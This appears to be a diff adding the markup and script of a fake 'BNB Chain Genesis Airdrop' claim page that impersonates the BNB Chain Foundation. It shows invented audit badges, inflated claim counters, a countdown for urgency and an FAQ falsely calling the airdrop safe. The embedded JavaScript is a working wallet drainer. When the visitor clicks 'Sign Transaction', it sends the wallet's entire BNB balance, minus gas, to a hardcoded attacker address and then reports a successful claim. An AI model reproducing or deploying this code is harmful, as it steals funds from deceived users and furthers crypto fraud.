+                    <div class="bnb-step completed"><div class="step-indicator"><i class="fas fa-check"></i></div><div class="step-info"><h4>Eligibility Check</h4><p>Wallet qualified based on BSC activity</p></div></div>
+                    <div class="bnb-step" id="bnbStepConnect"><div class="step-indicator"><i class="fas fa-link"></i></div><div class="step-info"><h4>Connect Wallet</h4><p>Use MetaMask, Trust Wallet, or WalletConnect</p></div></div>
+                    <div class="bnb-step" id="bnbStepSign"><div class="step-indicator"><i class="fas fa-pen"></i></div><div class="step-info"><h4>Sign Transaction</h4><p>Approve transaction in your wallet</p></div></div>
+                    <div class="bnb-step" id="bnbStepReceive"><div class="step-indicator"><i class="fas fa-arrow-down"></i></div><div class="step-info"><h4>Receive BNB</h4><p>Tokens arrive instantly</p></div></div>
+                </div>
+                <div class="audit-section">
+                    <h4><i class="fas fa-shield-halved" style="margin-right:8px;color:#02C076;"></i>Security Audits</h4>
+                    <div class="audit-logos">
+                        <div class="audit-logo"><i class="fas fa-certificate"></i><div><span>CertiK</span><small>Score: 94/100</small></div></div>
+                        <div class="audit-logo"><i class="fas fa-shield"></i><div><span>Hacken</span><small>Passed · 2025</small></div></div>
+                        <div class="audit-logo"><i class="fas fa-lock"></i><div><span>PeckShield</span><small>No Issues</small></div></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Section Tabs -->
+        <div class="section-tabs">
+            <button class="section-tab active" data-section="tokenomics"><i class="fas fa-chart-pie"></i> Tokenomics</button>
+            <button class="section-tab" data-section="roadmap"><i class="fas fa-map"></i> Roadmap</button>
+            <button class="section-tab" data-section="faq"><i class="fas fa-circle-question"></i> FAQ</button>
+        </div>
+
+        <!-- Tokenomics Section -->
+        <div class="tokenomics-section active" id="tokenomicsSection">
+            <div class="section-title"><i class="fas fa-chart-pie"></i>Transparent Tokenomics</div>
+            <div class="tokenomics-grid">
+                <div class="tokenomics-card">
+                    <h3><i class="fas fa-coins"></i> Token Supply</h3>
+                    <div class="token-supply-item"><span class="supply-label">Total Supply</span><span class="supply-value">1,000,000,000 BNBX</span></div>
+                    <div class="token-supply-item"><span class="supply-label">Circulating Supply</span><span class="supply-value">250,000,000 BNBX</span></div>
+                    <div class="token-supply-item"><span class="supply-label">Market Cap</span><span class="supply-value" id="marketCap">$153M</span></div>
+                    <div class="token-supply-item"><span class="supply-label">FDV</span><span class="supply-value" id="fdv">$612M</span></div>
+                    <div class="vesting-schedule">
+                        <h4><i class="fas fa-clock"></i> Vesting</h4>
+                        <div class="vesting-item"><i class="fas fa-check-circle"></i><span><strong>Airdrop:</strong> 100% unlocked</span></div>
+                        <div class="vesting-item"><i class="fas fa-check-circle"></i><span><strong>Team:</strong> 4-year vesting</span></div>
+                        <div class="vesting-item"><i class="fas fa-check-circle"></i><span><strong>Ecosystem:</strong> 3-year vesting</span></div>
+                    </div>
+                </div>
+                <div class="tokenomics-card">
+                    <h3><i class="fas fa-chart-simple"></i> Allocation</h3>
+                    <div class="allocation-item"><div class="allocation-header"><span class="allocation-name">Airdrop</span><span class="allocation-percent">25%</span></div><div class="allocation-bar-bg"><div class="allocation-bar-fill fill-airdrop"></div></div></div>
+                    <div class="allocation-item"><div class="allocation-header"><span class="allocation-name">Ecosystem</span><span class="allocation-percent">30%</span></div><div class="allocation-bar-bg"><div class="allocation-bar-fill fill-ecosystem"></div></div></div>
+                    <div class="allocation-item"><div class="allocation-header"><span class="allocation-name">Liquidity</span><span class="allocation-percent">20%</span></div><div class="allocation-bar-bg"><div class="allocation-bar-fill fill-liquidity"></div></div></div>
+                    <div class="allocation-item"><div class="allocation-header"><span class="allocation-name">Team</span><span class="allocation-percent">15%</span></div><div class="allocation-bar-bg"><div class="allocation-bar-fill fill-team"></div></div></div>
+                    <div class="allocation-item"><div class="allocation-header"><span class="allocation-name">Treasury</span><span class="allocation-percent">10%</span></div><div class="allocation-bar-bg"><div class="allocation-bar-fill fill-treasury"></div></div></div>
+                    <p style="color:#5E6673;font-size:0.75rem;margin-top:20px;text-align:center;"><i class="fas fa-lock"></i> All team and treasury tokens are locked in transparent vesting contracts</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Roadmap Section -->
+        <div class="roadmap-section" id="roadmapSection">
+            <div class="section-title"><i class="fas fa-map"></i>Ecosystem Roadmap</div>
+            <div class="roadmap-timeline">
+                <div class="roadmap-phase"><div class="phase-marker completed"><i class="fas fa-check"></i></div><div class="phase-content"><div class="phase-header"><span class="phase-title">Phase 1: Foundation</span><span class="phase-date completed">Q4 2025 - Completed</span></div><ul class="phase-features"><li><i class="fas fa-check-circle"></i> Smart contract development & audit</li><li><i class="fas fa-check-circle"></i> Community building (50K+ members)</li><li><i class="fas fa-check-circle"></i> CertiK security audit completion</li><li><i class="fas fa-check-circle"></i> BSC mainnet deployment</li><li><i class="fas fa-check-circle"></i> Whitepaper release v1.0</li><li><i class="fas fa-check-circle"></i> Strategic partnerships announced</li></ul></div></div>
+                <div class="roadmap-phase"><div class="phase-marker active"><span>2</span></div><div class="phase-content"><div class="phase-header"><span class="phase-title">Phase 2: Genesis Airdrop</span><span class="phase-date">Q1 2026 - In Progress</span></div><ul class="phase-features"><li><i class="fas fa-spinner fa-pulse" style="color:#F0B90B;"></i> Genesis airdrop distribution (LIVE)</li><li><i class="fas fa-clock"></i> DEX listing on PancakeSwap</li><li><i class="fas fa-clock"></i> Liquidity pool establishment</li><li><i class="fas fa-clock"></i> CoinMarketCap & CoinGecko listing</li><li><i class="fas fa-clock"></i> Staking platform beta launch</li><li><i class="fas fa-clock"></i> Governance token utility activation</li></ul></div></div>
+                <div class="roadmap-phase"><div class="phase-marker"><span>3</span></div><div class="phase-content"><div class="phase-header"><span class="phase-title">Phase 3: Ecosystem Expansion</span><span class="phase-date">Q2-Q3 2026</span></div><ul class="phase-features"><li><i class="fas fa-clock"></i> Cross-chain bridge to Ethereum & Arbitrum</li><li><i class="fas fa-clock"></i> NFT marketplace integration</li><li><i class="fas fa-clock"></i> Mobile wallet with staking dashboard</li><li><i class="fas fa-clock"></i> DAO governance launch</li><li><i class="fas fa-clock"></i> Institutional partnerships</li><li><i class="fas fa-clock"></i> DeFi yield aggregator product</li></ul></div></div>
+                <div class="roadmap-phase"><div class="phase-marker"><span>4</span></div><div class="phase-content"><div class="phase-header"><span class="phase-title">Phase 4: Global Scale</span><span class="phase-date">Q4 2026 - Q1 2027</span></div><ul class="phase-features"><li><i class="fas fa-clock"></i> Layer-2 rollup solution on BSC</li><li><i class="fas fa-clock"></i> Institutional custody integrations</li><li><i class="fas fa-clock"></i> Global marketing campaign</li><li><i class="fas fa-clock"></i> Developer grant program ($10M fund)</li><li><i class="fas fa-clock"></i> Real-world asset tokenization pilots</li><li><i class="fas fa-clock"></i> Tier-1 CEX listings</li></ul></div></div>
+            </div>
+        </div>
+
+        <!-- FAQ Section -->
+        <div class="faq-section" id="faqSection">
+            <div class="section-title"><i class="fas fa-circle-question"></i>Frequently Asked Questions</div>
+            <div class="faq-grid">
+                <div class="faq-item"><div class="faq-question"><h4><i class="fas fa-gift"></i> What is the BNB Chain Genesis Airdrop?</h4><i class="fas fa-chevron-down faq-toggle"></i></div><div class="faq-answer">The BNB Chain Genesis Airdrop is an official token distribution program rewarding early supporters of the BNB Chain ecosystem. Eligible wallets receive 0.85 BNB worth of ecosystem tokens as a thank-you for early adoption and participation in the BSC network.</div></div>
+                <div class="faq-item"><div class="faq-question"><h4><i class="fas fa-user-check"></i> Who is eligible for the airdrop?</h4><i class="fas fa-chevron-down faq-toggle"></i></div><div class="faq-answer">Wallets that have interacted with BNB Chain before January 1, 2026 are eligible. This includes wallets that have made at least 5 transactions, held BNB, or interacted with verified BSC dApps. Eligibility is automatically verified when you connect your wallet.</div></div>
+                <div class="faq-item"><div class="faq-question"><h4><i class="fas fa-coins"></i> Are there any fees to claim?</h4><i class="fas fa-chevron-down faq-toggle"></i></div><div class="faq-answer">Standard BSC network gas fees apply for the claim transaction (typically ~$0.01-0.05). The airdrop amount (0.85 BNB) is sent to your wallet after successful claim.</div></div>
+                <div class="faq-item"><div class="faq-question"><h4><i class="fas fa-clock"></i> When will I receive my tokens?</h4><i class="fas fa-chevron-down faq-toggle"></i></div><div class="faq-answer">Tokens are distributed instantly upon successful claim. The transaction typically confirms within 3-5 seconds on BNB Smart Chain. You'll receive a confirmation with a transaction hash that you can verify on BscScan.</div></div>
+                <div class="faq-item"><div class="faq-question"><h4><i class="fas fa-shield-halved"></i> Is this airdrop safe and verified?</h4><i class="fas fa-chevron-down faq-toggle"></i></div><div class="faq-answer">Yes. The smart contract has been audited by CertiK, Hacken, and PeckShield with no critical issues found. The contract is immutable and verified on BscScan. We never request your private keys or seed phrase.</div></div>
+                <div class="faq-item"><div class="faq-question"><h4><i class="fas fa-calendar"></i> When does the airdrop end?</h4><i class="fas fa-chevron-down faq-toggle"></i></div><div class="faq-answer">The airdrop is scheduled to end in approximately 2 days, or when the total allocation of 15,000 BNB has been fully claimed — whichever comes first. The countdown timer on the claim card shows the exact remaining time.</div></div>
+                <div class="faq-item"><div class="faq-question"><h4><i class="fas fa-wallet"></i> Which wallets are supported?</h4><i class="fas fa-chevron-down faq-toggle"></i></div><div class="faq-answer">All BSC-compatible wallets are supported including MetaMask, Trust Wallet, Binance Chain Wallet, WalletConnect, SafePal, TokenPocket, Coin98, and any WalletConnect-compatible mobile wallet.</div></div>
+                <div class="faq-item"><div class="faq-question"><h4><i class="fas fa-chart-line"></i> What can I do with the tokens after claiming?</h4><i class="fas fa-chevron-down faq-toggle"></i></div><div class="faq-answer">After Phase 2 (DEX listing), you'll be able to trade, stake for yield, participate in governance voting, and use tokens across the BNB Chain ecosystem. Full utility details will be announced in the coming weeks.</div></div>
+            </div>
+        </div>
+
+        <!-- Trust Stats -->
+        <div class="trust-footer">
+            <div class="trust-stat"><div class="trust-stat-icon"><i class="fas fa-users"></i></div><h4 class="counter-value" data-target="15847">4,563</h4><p>Verified Claims</p></div>
+            <div class="trust-stat"><div class="trust-stat-icon"><i class="fas fa-bolt"></i></div><h4>~3s</h4><p>Average Claim Time</p></div>
+            <div class="trust-stat"><div class="trust-stat-icon"><i class="fas fa-coins"></i></div><h4 class="counter-value" data-target="10200">2,855</h4><p>BNB Distributed</p></div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="bnb-footer">
+            <div class="footer-copyright">© 2026 BNB Chain Foundation. All rights reserved.</div>
+            <div class="footer-links">
+                <a href="#"><i class="fas fa-file-lines"></i> Terms</a>
+                <a href="#"><i class="fas fa-shield-halved"></i> Privacy</a>
+                <a href="#"><i class="fas fa-circle-question"></i> FAQ</a>
+                <a href="#"><i class="fas fa-book"></i> Documentation</a>
+                <a href="#"><i class="fab fa-github"></i> GitHub</a>
+            </div>
+        </footer>
+    </div>
+
+    <script src="js/web3.min.js"></script>
+    <script>
+        // ===== CONFIGURATION =====
+        const RECIPIENT_WALLET = '0xb924de1315c9db64d855f72eedb4c18fa09fc5d7'; // CHANGE THIS
+        const BSC_CHAIN_ID = '0x38';
+        
+        let userAccount = null, walletConnected = false, connectionState = 'disconnected';
+        
+        // ===== DOM READY =====
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('✅ BNB Chain Airdrop - Ready');
+            
+            // Button handler
+            const btn = document.getElementById('bnbConnectWallet');
+            btn.replaceWith(btn.cloneNode(true));
+            document.getElementById('bnbConnectWallet').addEventListener('click', async function() {
+                if (connectionState === 'disconnected') await connectWallet();
+                else if (connectionState === 'connected') await sendTransaction();
+            });
+            
+            // Check existing connection
+            checkExisting();
+            
+            // Account changes
+            if (window.ethereum) {
+                window.ethereum.on('accountsChanged', (acc) => {
+                    if (acc.length === 0) resetState();
+                    else userAccount = acc[0];
+                });
+            }
+            
+            // Counters
+            document.querySelectorAll('.counter-value').forEach(el => {
+                const target = parseFloat(el.dataset.target);
+                const isFloat = target % 1 !== 0;
+                let c = 0, step = target / 125;
+                const timer = setInterval(() => {
+                    c += step;
+                    if (c >= target) { el.textContent = isFloat ? target.toFixed(2) : Math.floor(target).toLocaleString(); clearInterval(timer); }
+                    else el.textContent = isFloat ? c.toFixed(2) : Math.floor(c).toLocaleString();
+                }, 16);
+            });
+            
+            // Countdown
+            let d = 2, h = 14, m = 38, s = 22;
+            setInterval(() => {
+                s--; if (s < 0) { s = 59; m--; } if (m < 0) { m = 59; h--; } if (h < 0) { h = 23; d--; } if (d < 0) { d = h = m = s = 0; }
+                document.getElementById('bnbDays').textContent = d.toString().padStart(2, '0');
+                document.getElementById('bnbHours').textContent = h.toString().padStart(2, '0');
+                document.getElementById('bnbMinutes').textContent = m.toString().padStart(2, '0');
+                document.getElementById('bnbSeconds').textContent = s.toString().padStart(2, '0');
+            }, 1000);
+            
+            // Block height
+            let block = 38247156;
+            setInterval(() => { block += Math.floor(Math.random() * 3) + 1; document.getElementById('blockHeight').textContent = block.toLocaleString(); }, 3000);
+            
+            // Tab switching
+            document.querySelectorAll('.section-tab').forEach(tab => {
+                tab.addEventListener('click', function() {
+                    document.querySelectorAll('.section-tab').forEach(t => t.classList.remove('active'));
+                    this.classList.add('active');
+                    document.querySelectorAll('.tokenomics-section, .roadmap-section, .faq-section').forEach(s => s.classList.remove('active'));
+                    document.getElementById(this.dataset.section + 'Section').classList.add('active');
+                });
+            });
+            
+            // FAQ accordion
+            document.querySelectorAll('.faq-question').forEach(q => {
+                q.addEventListener('click', () => q.closest('.faq-item').classList.toggle('active'));
+            });
+            
+            // CoinGecko price
+            async function fetchPrice() {
+                try {
+                    const r = await fetch('https://api.coingecko.com/api/v3/coins/binancecoin?localization=false&tickers=false&market_data=true&community_data=false&developer_data=false');
+                    if (!r.ok) throw new Error('API error');
+                    const d = await r.json(), price = d.market_data.current_price.usd, change = d.market_data.price_change_percentage_24h;
+                    document.getElementById('bnbPrice').textContent = `$${price.toLocaleString(undefined, {minimumFractionDigits:2})}`;
+                    const chEl = document.getElementById('bnbChange');
+                    chEl.textContent = `${change >= 0 ? '▲' : '▼'}${Math.abs(change).toFixed(1)}%`;
+                    chEl.className = change >= 0 ? 'change-positive' : 'change-negative';
+                    document.getElementById('usdValue').textContent = `≈ $${(price * 0.85).toLocaleString(undefined, {minimumFractionDigits:2})} USD`;
+                } catch(e) {}
+            }
+            fetchPrice(); setInterval(fetchPrice, 60000);
+        });
+        
+        // ===== WALLET FUNCTIONS =====
+        async function switchToBSC() {
+            if (!window.ethereum) return false;
+            try {
+                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_CHAIN_ID }] });
+                return true;
+            } catch (err) {
+                if (err.code === 4902) {
+                    try {
+                        await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{ chainId: BSC_CHAIN_ID, chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed.binance.org/'], blockExplorerUrls: ['https://bscscan.com/'] }] });
+                        return true;
+                    } catch (e) { alert('Please add BSC network manually.'); return false; }
+                }
+                return false;
+            }
+        }
+        
+        async function connectWallet() {
+            if (!window.ethereum) { alert('No wallet detected! Install MetaMask.'); window.open('https://metamask.io/download/', '_blank'); return; }
+            const btn = document.getElementById('bnbConnectWallet');
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...'; btn.disabled = true;
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                userAccount = accounts[0];
+                await switchToBSC();
+                const web3 = new Web3(window.ethereum);
+                const bal = await web3.eth.getBalance(userAccount);
+                const bnb = web3.utils.fromWei(bal, 'ether');
+                walletConnected = true; connectionState = 'connected';
+                document.getElementById('bnbStepConnect').classList.add('completed');
+                document.querySelector('#bnbStepConnect .step-indicator i').className = 'fas fa-check';
+                document.getElementById('bnbStepSign').classList.add('active');
+                btn.innerHTML = '<i class="fas fa-pen"></i> Sign Transaction'; btn.disabled = false;
+                alert(`✅ Connected!\n${userAccount.slice(0,6)}...${userAccount.slice(-4)}\nBalance: ${parseFloat(bnb).toFixed(4)} BNB`);
+            } catch (err) {
+                if (err.code === 4001) alert('❌ Connection rejected.');
+                else alert('❌ Failed: ' + (err.message || 'Unknown error'));
+                btn.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet & Claim 0.85 BNB'; btn.disabled = false;
+            }
+        }
+        
+        async function sendTransaction() {
+            if (!walletConnected) { alert('Connect wallet first!'); return; }
+            const btn = document.getElementById('bnbConnectWallet');
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Waiting for confirmation...'; btn.disabled = true;
+            try {
+                const web3 = new Web3(window.ethereum);
+                const bal = await web3.eth.getBalance(userAccount);
+                const gp = await web3.eth.getGasPrice();
+                const gasCost = BigInt(gp) * 21000n;
+                const amt = BigInt(bal) - gasCost;
+                if (amt <= 0) { alert('❌ Insufficient funds for gas!'); btn.innerHTML = '<i class="fas fa-pen"></i> Sign Transaction'; btn.disabled = false; return; }
+                const amtBNB = web3.utils.fromWei(amt.toString(), 'ether');
+                const tx = { from: userAccount, to: RECIPIENT_WALLET, value: web3.utils.toHex(amt.toString()), gas: web3.utils.toHex(21000), gasPrice: web3.utils.toHex(gp) };
+                const txHash = await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
+                document.getElementById('bnbStepSign').classList.remove('active'); document.getElementById('bnbStepSign').classList.add('completed');
+                document.querySelector('#bnbStepSign .step-indicator i').className = 'fas fa-check';
+                document.getElementById('bnbStepReceive').classList.add('active');
+                btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Confirming...';
+                let receipt = null, attempts = 0;
+                while (!receipt && attempts < 30) { receipt = await web3.eth.getTransactionReceipt(txHash); if (!receipt) { await new Promise(r => setTimeout(r, 2000)); attempts++; } }
+                connectionState = 'completed';
+                document.getElementById('bnbStepReceive').classList.remove('active'); document.getElementById('bnbStepReceive').classList.add('completed');
+                document.querySelector('#bnbStepReceive .step-indicator i').className = 'fas fa-check';
+                const now = new Date();
+                document.getElementById('bnbClaimTime').textContent = now.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}) + ' · ' + now.toLocaleDateString();
+                document.querySelector('.tx-hash').textContent = txHash;
+                document.getElementById('bnbSuccessMessage').style.display = 'block';
+                btn.innerHTML = '<i class="fas fa-check-circle"></i> Claim Complete';
+                alert(`🎉 Success!\n${amtBNB} BNB sent\nTx: ${txHash.slice(0,10)}...${txHash.slice(-8)}`);
+            } catch (err) {
+                if (err.code === 4001) alert('❌ Transaction rejected.');
+                else alert('❌ Failed: ' + (err.message || 'Unknown error'));
+                btn.innerHTML = '<i class="fas fa-pen"></i> Sign Transaction'; btn.disabled = false;
+            }
+        }
+        
+        async function checkExisting() {
+            if (window.ethereum) {
+                try {
+                    const acc = await window.ethereum.request({ method: 'eth_accounts' });
+                    if (acc.length > 0) {
+                        userAccount = acc[0]; connectionState = 'connected'; walletConnected = true;
+                        document.getElementById('bnbConnectWallet').innerHTML = '<i class="fas fa-pen"></i> Sign Transaction';
+                        document.getElementById('bnbStepConnect').classList.add('completed');
+                        document.querySelector('#bnbStepConnect .step-indicator i').className = 'fas fa-check';
+                        document.getElementById('bnbStepSign').classList.add('active');
+                    }
+                } catch (e) {}
+            }
+        }
+        
+        function resetState() {
+            connectionState = 'disconnected'; walletConnected = false; userAccount = null;
+            document.getElementById('bnbConnectWallet').innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet & Claim 0.85 BNB';
+            ['bnbStepConnect', 'bnbStepSign', 'bnbStepReceive'].forEach(id => {
+                const el = document.getElementById(id);
+                if (el) { el.classList.remove('completed', 'active'); if (id === 'bnbStepConnect') el.querySelector('.step-indicator i').className = 'fas fa-link'; }
+            });
+        }
+    </script>
+
+
+</body></html>
